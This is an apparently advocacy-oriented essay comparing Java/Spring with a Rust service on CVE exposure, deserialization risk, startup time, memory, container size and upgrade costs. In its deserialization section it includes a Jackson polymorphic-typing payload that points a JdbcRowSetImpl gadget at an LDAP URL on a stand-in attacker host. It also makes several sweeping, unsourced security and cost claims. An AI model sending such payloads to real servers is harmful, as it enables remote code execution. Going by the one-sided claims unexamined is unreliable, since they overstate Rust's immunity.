# The Hidden Costs: Security, Infrastructure & Operations

## What This Document Covers

The Java/Spring ecosystem has decades of tooling, support contracts, and 
institutional knowledge that makes it "work." But this masks fundamental 
issues that are rarely questioned:

1. **Security** - Runtime injection, reflection, deserialization, CVE exposure
2. **Startup Times** - Docker cold start, Kubernetes scaling, serverless incompatibility
3. **Resource Footprint** - JVM heap, memory overhead, container sizing, cloud costs
4. **Attack Surface** - Dependency count, transitive vulnerabilities, SBOM complexity
5. **Operational Burden** - CVE patching, upgrade treadmill, compatibility matrix

These issues aren't solved—they're **institutionally tolerated** because 
"that's how Java works."

---

## 1. The Dependency Hell Reality

### Spring Boot Starter Web: What You Actually Get

```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-web</artifactId>
</dependency>
```

**One line. What it pulls in:**

```
$ mvn dependency:tree | wc -l
147 dependencies

$ mvn dependency:tree | grep -c "org.springframework"
34 Spring modules

$ mvn dependency:tree | grep -c "jackson"
12 Jackson modules

$ mvn dependency:tree | grep -c "tomcat"
5 Tomcat modules

$ mvn dependency:tree | grep -c "log"
8 Logging modules
```

**A typical Spring Boot app with JPA, Security, and Actuator:**

| Category | Count |
|----------|-------|
| Total dependencies | 200-350 |
| Direct dependencies | 15-25 |
| Transitive dependencies | 185-325 |
| Unique CVE-trackable artifacts | 200+ |

### ob-poc Rust Dependencies

```
$ cargo tree | wc -l
89 crates

$ cargo tree --depth 1 | wc -l
23 direct dependencies
```

**And crucially:** Rust dependencies are compile-time resolved. No runtime 
class loading. No reflection-based injection. No deserialization surprises.

---

## 2. CVE Exposure: The Numbers

### Spring Ecosystem CVE History (Selected)

| CVE | Year | Severity | Component | Impact |
|-----|------|----------|-----------|--------|
| CVE-2022-22965 | 2022 | **Critical 9.8** | Spring Framework | RCE (Spring4Shell) |
| CVE-2022-22963 | 2022 | **Critical 9.8** | Spring Cloud Function | RCE |
| CVE-2021-44228 | 2021 | **Critical 10.0** | Log4j (transitive) | RCE (Log4Shell) |
| CVE-2022-22978 | 2022 | Critical 9.8 | Spring Security | AuthZ bypass |
| CVE-2022-22976 | 2022 | High 8.1 | Spring Security | BCrypt truncation |
| CVE-2023-20861 | 2023 | High 7.5 | Spring Framework | DoS |
| CVE-2023-20863 | 2023 | High 7.5 | Spring Framework | DoS via SpEL |
| CVE-2023-34034 | 2023 | Critical 9.8 | Spring Security | AuthZ bypass |
| CVE-2024-22233 | 2024 | High 7.5 | Spring Framework | DoS |
| CVE-2024-22234 | 2024 | High 7.5 | Spring Security | AuthZ bypass |

**This is not ancient history. Critical RCE vulnerabilities in 2022, 2023, 2024.**

### Why Java/Spring Is Vulnerable

| Attack Vector | Why It Exists |
|---------------|---------------|
| **Deserialization RCE** | ObjectInputStream trusts serialized data |
| **SpEL Injection** | Runtime expression evaluation |
| **Class Loading Attacks** | Dynamic classloader manipulation |
| **Reflection Attacks** | setAccessible() bypasses encapsulation |
| **JNDI Injection** | Log4Shell - lookup URLs in log messages |
| **Property Injection** | Spring4Shell - class.module.classLoader |

**These are architectural.** They exist because Java chose:
- Runtime reflection over compile-time resolution
- Dynamic class loading over static linking
- Serialization magic over explicit parsing
- Convention over explicit configuration

### Rust's Security Model

| Java Attack Vector | Rust Equivalent |
|--------------------|-----------------|
| Deserialization RCE | Serde is compile-time, no arbitrary code execution |
| Reflection attacks | No runtime reflection exists |
| Class loading attacks | No class loading exists |
| JNDI/lookup injection | No equivalent mechanism |
| Property binding injection | No runtime property binding |

**The attack surface doesn't exist** because the language doesn't have 
the features that enable it.

---

## 3. Runtime Injection Vulnerabilities

### Spring's DI Is A Runtime Operation

```java
@RestController
public class CbuController {
    
    private final CbuService cbuService;
    
    // This happens at RUNTIME via reflection
    public CbuController(CbuService cbuService) {
        this.cbuService = cbuService;
    }
}
```

**What actually happens:**
1. Spring scans classpath for `@Component` classes
2. Reflection reads constructor parameters
3. Bean instances created via `Constructor.newInstance()`
4. Dependencies injected via reflection
5. Proxies wrapped around for AOP

**Attack implications:**
- Classpath manipulation can inject malicious beans
- Reflection can be exploited to bypass security
- Proxy chains can be manipulated
- Bean post-processors can intercept/modify beans

### Rust's Compile-Time Wiring

```rust
pub fn create_app(pool: PgPool) -> Router {
    let cbu_service = CbuService::new(pool.clone());
    
    Router::new()
        .route("/cbus", post(move |body| create_cbu(body, cbu_service)))
}
```

**What happens:**
1. Compiler verifies types at compile time
2. Functions are directly called—no reflection
3. No proxies, no interception points
4. Binary contains exactly what you wrote

**Attack surface:** None from DI. The mechanism doesn't exist at runtime.

---

## 4. Deserialization: The Forever Vulnerability

### Jackson + Spring: A Dangerous Combination

```java
@PostMapping("/cbus")
public CbuResponse createCbu(@RequestBody CreateCbuRequest request) {
    // Jackson deserializes JSON to object
    // What could go wrong?
}
```

**Jackson deserialization attacks (polymorphic):**

```json
{
  "name": "Alpha Fund",
  "jurisdiction": ["com.sun.rowset.JdbcRowSetImpl", {
    "dataSourceName": "ldap://attacker.com/exploit",
    "autoCommit": true
  }]
}
```

If polymorphic type handling is enabled (common for flexibility), 
Jackson will instantiate arbitrary classes.

**Mitigations exist but are opt-in:**
```java
@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)
@JsonSubTypes({
    @JsonSubTypes.Type(value = Dog.class, name = "dog"),
    @JsonSubTypes.Type(value = Cat.class, name = "cat")
})
public abstract class Animal { }

// Or globally:
objectMapper.activateDefaultTyping(
    LaissezFaireSubTypeValidator.instance,  // DANGER: allows all types
    ObjectMapper.DefaultTyping.NON_FINAL
);
```

**The problem:** You must actively prevent exploitation. 
Default configurations have been vulnerable multiple times.

### Rust + Serde: Compile-Time Safety

```rust
#[derive(Deserialize)]
pub struct CreateCbuRequest {
    name: String,
    jurisdiction: String,
}

async fn create_cbu(Json(request): Json<CreateCbuRequest>) -> impl IntoResponse {
    // Serde deserializes at compile-time determined types
    // No polymorphic instantiation possible
}
```

**Why this is safe:**
1. `Deserialize` is derived at compile time
2. Only fields defined in struct are parsed
3. No mechanism to instantiate arbitrary types
4. No reflection to exploit

**There is no equivalent attack vector.** The feature doesn't exist.

---

## 5. Startup Time: The Hidden Tax

### JVM + Spring Boot Cold Start

```
# Minimal Spring Boot Web App
$ time java -jar app.jar

Started Application in 4.832 seconds (JVM running for 5.612)

# Spring Boot with JPA + Security + Actuator
Started Application in 12.347 seconds (JVM running for 13.891)

# Large enterprise app (200+ beans)
Started Application in 45-90 seconds
```

**Where the time goes:**
| Phase | Time |
|-------|------|
| JVM startup | 0.5-1s |
| Class loading | 1-3s |
| Classpath scanning | 2-5s |
| Bean instantiation | 2-10s |
| Proxy generation | 1-5s |
| JPA metamodel | 2-10s |
| Connection pool init | 1-3s |
| Hibernate validation | 1-5s |

### Kubernetes/Docker Implications

**Pod scaling scenario:**
```yaml
# Kubernetes HPA triggers scale-up
# Traffic spike detected at T+0

T+0:    Scale event triggered
T+2:    New pod scheduled
T+5:    Container image pulled (cached)
T+7:    Container started
T+52:   Spring Boot ready (45s startup)
T+55:   Readiness probe passes
T+55:   Traffic routed to new pod

# User-facing latency: 55 seconds before new capacity
```

**Rust equivalent:**
```
T+0:    Scale event triggered
T+2:    New pod scheduled
T+5:    Container image pulled (cached)
T+5.1:  Container started
T+5.2:  Application ready (100ms startup)
T+6:    Readiness probe passes
T+6:    Traffic routed to new pod

# User-facing latency: 6 seconds
```

**9x faster scaling response.**

### Serverless: Java Is Disqualified

AWS Lambda cold start times:
| Runtime | Cold Start | Warm |
|---------|------------|------|
| Rust | 10-50ms | 1-5ms |
| Go | 30-100ms | 1-10ms |
| Python | 100-300ms | 5-50ms |
| Node.js | 100-500ms | 5-50ms |
| Java (plain) | 500-3000ms | 10-100ms |
| Java + Spring | 3000-15000ms | 50-200ms |

**Spring Boot on Lambda is 100-300x slower cold start than Rust.**

GraalVM Native Image helps but:
- Build times: 5-15 minutes
- Reflection configuration nightmare
- Many libraries don't work
- Still 200-500ms cold start (10-50x slower than Rust)

---

## 6. Memory Footprint: The Cloud Cost Multiplier

### JVM Memory Requirements

```
# Minimum viable Spring Boot app
java -Xms256m -Xmx512m -jar app.jar

# "Production" settings
java -Xms1g -Xmx2g -XX:MetaspaceSize=256m -jar app.jar

# Enterprise app with headroom
java -Xms2g -Xmx4g -XX:MetaspaceSize=512m -jar app.jar
```

**Where memory goes:**
| Component | Typical Size |
|-----------|--------------|
| JVM base overhead | 100-200MB |
| Metaspace (classes) | 100-300MB |
| Spring context | 100-300MB |
| Hibernate metamodel | 50-200MB |
| Connection pools | 50-100MB |
| Thread stacks (200 threads × 1MB) | 200MB |
| Application heap | 200MB-2GB |
| **Minimum viable** | **800MB-1.5GB** |

### Rust Memory Requirements

```
# ob-poc in production
RSS: 45MB idle
RSS: 120MB under load (50 concurrent requests)
```

**Comparison:**
| Metric | Spring Boot | Rust |
|--------|-------------|------|
| Minimum RAM | 512MB-1GB | 32MB |
| Recommended RAM | 2GB-4GB | 64-128MB |
| Under load | 2GB-8GB | 128-256MB |

### Cloud Cost Implications

**Kubernetes resource requests:**

Spring Boot:
```yaml
resources:
  requests:
    memory: "1Gi"
    cpu: "500m"
  limits:
    memory: "2Gi"
    cpu: "2000m"
```

Rust:
```yaml
resources:
  requests:
    memory: "64Mi"
    cpu: "100m"
  limits:
    memory: "256Mi"
    cpu: "500m"
```

**Cost calculation (AWS EKS, 10 replicas):**

| Resource | Spring Boot | Rust | Savings |
|----------|-------------|------|---------|
| Memory requested | 10GB | 640MB | 94% |
| CPU requested | 5 cores | 1 core | 80% |
| Monthly cost (m5.large equiv) | ~$800 | ~$80 | $720/mo |
| Annual savings | - | - | **$8,640** |

**And that's one microservice.** Enterprise systems have dozens.

---

## 7. Container Security: Attack Surface

### Java Container Image

```dockerfile
FROM eclipse-temurin:17-jre-jammy
COPY target/app.jar /app.jar
ENTRYPOINT ["java", "-jar", "/app.jar"]
```

**Image contents:**
```
$ docker image ls app:java
REPOSITORY   TAG    SIZE
app          java   389MB

$ dive app:java
Layer 1: 78MB   - Ubuntu base
Layer 2: 194MB  - JRE (12,847 files)
Layer 3: 117MB  - Application JAR (unpacked: 200+ JARs)

Total files: 15,000+
Total CVE scan surface: 15,000+ files
```

### Rust Container Image

```dockerfile
FROM scratch
COPY --from=builder /app/target/release/app /app
ENTRYPOINT ["/app"]
```

**Image contents:**
```
$ docker image ls app:rust
REPOSITORY   TAG    SIZE
app          rust   12MB

$ dive app:rust
Layer 1: 12MB   - Single static binary

Total files: 1
Total CVE scan surface: 1 file
```

### Security Scan Comparison

**Trivy scan of Spring Boot image:**
```
$ trivy image app:java

Total: 127 (UNKNOWN: 2, LOW: 45, MEDIUM: 52, HIGH: 24, CRITICAL: 4)

CRITICAL:
- CVE-2024-XXXX: glibc buffer overflow
- CVE-2023-XXXX: OpenSSL vulnerability
- CVE-2023-XXXX: libcurl RCE
- CVE-2023-XXXX: zlib heap overflow

HIGH:
- 24 vulnerabilities in OS packages
- Plus whatever's in your 200 JARs...
```

**Trivy scan of Rust scratch image:**
```
$ trivy image app:rust

Total: 0 (no OS packages to scan)

Note: Binary compiled with musl, statically linked.
No external dependencies at runtime.
```

**The Rust binary has nothing to exploit** at the OS level because 
there's no OS in the container.

---

## 8. The Upgrade Treadmill

### Spring's Compatibility Matrix

```
Spring Boot 3.x requires:
- Java 17+ (not 11, not 8)
- Jakarta EE 9+ (not javax.*)
- Spring Framework 6.x
- Hibernate 6.x (not 5.x)
- Spring Security 6.x

Upgrading from Spring Boot 2.7 to 3.0:
- Change all javax.* → jakarta.*
- Update ALL dependencies to Jakarta-compatible versions
- Fix Hibernate 5 → 6 breaking changes
- Fix Spring Security configuration changes
- Fix removed/deprecated APIs
```

**Typical upgrade effort:** 2-4 weeks for a medium application

**And you must upgrade** because:
- Spring Boot 2.7: End of OSS support Feb 2024
- Java 11: End of public updates Sep 2023
- Running old versions = unpatched CVEs

### Rust's Story

```
# Upgrade Rust compiler
$ rustup update stable

# Check if code still compiles
$ cargo build

# That's usually it.
```

Rust has strong backward compatibility guarantees. Code from 2018 
still compiles with 2024 Rust.

**Dependency updates:**
```
$ cargo update  # Update within semver ranges
$ cargo audit   # Check for known vulnerabilities
```

No "big bang" migrations. No namespace changes. No compatibility matrices.

---

## 9. Runtime Introspection = Attack Surface

### What Java Exposes At Runtime

```java
// Any code can do this:
Class<?> clazz = obj.getClass();
Field[] fields = clazz.getDeclaredFields();
for (Field f : fields) {
    f.setAccessible(true);  // Bypass private!
    Object value = f.get(obj);
    // Read ANY field, including security-sensitive ones
}

// Or even worse:
Method method = clazz.getDeclaredMethod("secretMethod");
method.setAccessible(true);
method.invoke(obj);  // Call private methods!
```

**This is how Spring works.** It's also how attackers work.

**Mitigation attempts:**
- SecurityManager (deprecated in Java 17, removed in Java 21)
- Module system (helps but most code doesn't use it)
- Sealed classes (limited applicability)

### What Rust Exposes At Runtime

```rust
// This doesn't compile:
// There is no reflection API

// You cannot:
// - List fields of a struct at runtime
// - Access private fields
// - Call private methods
// - Instantiate arbitrary types from strings
// - Load code dynamically

// The ONLY introspection is:
std::any::type_name::<T>()  // Returns type name as string
// That's it. You can't DO anything with it.
```

**The attack surface doesn't exist.**

---

## 10. SBOM & Supply Chain

### Java SBOM Complexity

```
# Generate SBOM for Spring Boot app
$ mvn org.cyclonedx:cyclonedx-maven-plugin:makeBom

Components: 287
- 23 direct dependencies
- 264 transitive dependencies

Licenses: 
- Apache-2.0: 198
- MIT: 34
- LGPL-2.1: 12
- EPL-1.0: 8
- BSD variants: 15
- Unknown: 20  # <-- Problem

Vulnerabilities (at time of build):
- Critical: 2
- High: 7
- Medium: 23
- Low: 45
```

**Each transitive dependency:**
- Can introduce CVEs
- Has its own release cycle
- May conflict with other transitive deps
- May be abandoned/unmaintained

### Rust SBOM

```
$ cargo sbom

Components: 89
- 23 direct dependencies
- 66 transitive dependencies

All licenses: Known and auditable via cargo-license
All vulnerabilities: Tracked via cargo-audit (RustSec database)

# One command to check everything:
$ cargo audit
    Fetching advisory database from `https://github.com/RustSec/advisory-db`
    Scanning Cargo.lock for vulnerabilities (89 crate dependencies)
```

**Fewer deps = smaller attack surface = easier compliance.**

---

## 11. The "It Works" Trap

### Why These Issues Get Ignored

| Issue | Why It's Tolerated |
|-------|-------------------|
| CVE exposure | "We have Snyk/Veracode, it's handled" |
| Slow startup | "We use warm pools / don't restart often" |
| Memory footprint | "Hardware is cheap" |
| Reflection attacks | "Our firewall/WAF blocks exploits" |
| Dependency hell | "We have a platform team managing versions" |
| Upgrade treadmill | "We budget 2 sprints per year for upgrades" |

**Translation:** We've institutionalized workarounds for fundamental problems.

### The Hidden Costs

| Workaround | Actual Cost |
|------------|-------------|
| Snyk/Veracode license | $50-200k/year |
| Warm pool infrastructure | 2-3x base compute cost |
| Platform team for deps | 2-4 FTEs = $400-800k/year |
| Security team for Java CVEs | 1-2 FTEs = $150-300k/year |
| Upgrade sprints | 4-8 weeks/year × team size |
| Incident response (Log4Shell, Spring4Shell) | $100k-1M per incident |

**These costs are real but spread across "infrastructure" and "security" 
budgets, so they don't appear on project cost sheets.**

---

## 12. Summary: The True Comparison

### Java/Spring Hidden Costs

| Category | Impact |
|----------|--------|
| **Security** | 200+ CVE-trackable deps, reflection attacks, deserialization vulns |
| **Startup** | 15-90 seconds, kills K8s scaling, disqualifies serverless |
| **Memory** | 1-4GB minimum, 10-50x higher cloud costs |
| **Container** | 300-500MB images, 15k+ files to scan |
| **Operations** | Constant CVE patching, annual major upgrades |
| **Compliance** | SBOM complexity, license sprawl |

### Rust Characteristics

| Category | Impact |
|----------|--------|
| **Security** | No reflection, no deserialization attacks, minimal CVE surface |
| **Startup** | 10-100ms, instant K8s scaling, serverless-ready |
| **Memory** | 32-128MB, 10-50x lower cloud costs |
| **Container** | 10-20MB images, 1 file to scan |
| **Operations** | cargo audit, backward-compatible upgrades |
| **Compliance** | Simple SBOM, clear licenses |

---

## The Question To Ask

When someone says "Let's use Spring, we know it":

> "What's our annual spend on:
> - Security scanning tools?
> - Platform team managing Java dependencies?
> - Cloud infrastructure for JVM memory overhead?
> - Incident response for Java CVEs?
> - Developer time on Spring upgrades?
> 
> Now show me those lines in the Rust project budget."

The costs exist. They're just hidden in different ledgers.
